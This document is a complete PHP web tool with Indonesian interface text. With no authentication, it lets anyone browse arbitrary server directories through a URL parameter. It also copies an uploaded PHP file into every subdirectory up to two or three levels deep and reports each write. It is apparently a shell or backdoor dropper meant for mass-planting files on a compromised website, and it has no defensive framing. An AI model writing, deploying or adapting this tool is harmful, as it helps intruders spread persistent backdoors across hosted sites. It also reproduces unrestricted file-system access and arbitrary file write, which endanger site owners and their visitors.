<?php
set_time_limit(0);

$currentDir = isset($_GET['path']) ? $_GET['path'] : getcwd();
$currentDir = realpath($currentDir);

if (!$currentDir || !is_dir($currentDir)) {
    die('Folder tidak ditemukan.');
}

echo "<h2>Upload ke Subfolder Level 2/3 dari: <code>$currentDir</code></h2>";

// Fungsi upload ke subdir dengan batas level max
function uploadToLimitedDepth($baseDir, $fileName, $fileContent, $maxDepth, $currentDepth = 0) {
    if ($currentDepth > $maxDepth) {
        return;
    }

    $items = scandir($baseDir);
    foreach ($items as $item) {
        if ($item != '.' && $item != '..') {
            $fullPath = $baseDir . DIRECTORY_SEPARATOR . $item;

            if (is_dir($fullPath)) {
                // Upload ke folder ini
                $targetFile = $fullPath . DIRECTORY_SEPARATOR . $fileName;
                if (file_put_contents($targetFile, $fileContent) !== false) {
                    echo "<span style='color:green;'>[UPLOADED]</span> $targetFile<br>";
                } else {
                    echo "<span style='color:red;'>[FAILED]</span> $targetFile<br>";
                }
                @ob_flush();
                @flush();

                // Recursively masuk subdir (tambah depth)
                uploadToLimitedDepth($fullPath, $fileName, $fileContent, $maxDepth, $currentDepth + 1);
            }
        }
    }
}

// Proses upload jika file di-submit
if (isset($_FILES['upload_file'])) {
    $fileTmpPath = $_FILES['upload_file']['tmp_name'];
    $fileName = $_FILES['upload_file']['name'];
    $fileContent = file_get_contents($fileTmpPath);

    // Limit ke subdir level 2 atau 3 dari folder aktif
    $maxDepth = 2; // <-- ganti ke 3 kalau mau sampai level 3
    uploadToLimitedDepth($currentDir, $fileName, $fileContent, $maxDepth);

    echo "<hr>";
}

// Form Upload
echo '<form method="post" enctype="multipart/form-data">
        <label>Pilih File PHP untuk diupload ke Subdir Level 2/3:</label><br>
        <input type="file" name="upload_file" required>
        <input type="submit" value="Upload ke Subfolder Level 2/3">
      </form>';

echo "<hr><h3>Isi Folder:</h3>";

// Navigasi ke atas (parent)
$parent = dirname($currentDir);
if ($parent && $parent != $currentDir) {
    echo "<a href='?path=" . urlencode($parent) . "'>[.. Kembali ke atas]</a><br>";
}

// List subfolder sebagai link
$items = scandir($currentDir);
foreach ($items as $item) {
    if ($item != '.' && $item != '..') {
        $fullPath = $currentDir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($fullPath)) {
            echo "<a href='?path=" . urlencode($fullPath) . "'>[DIR] $item</a><br>";
        }
    }
}
?>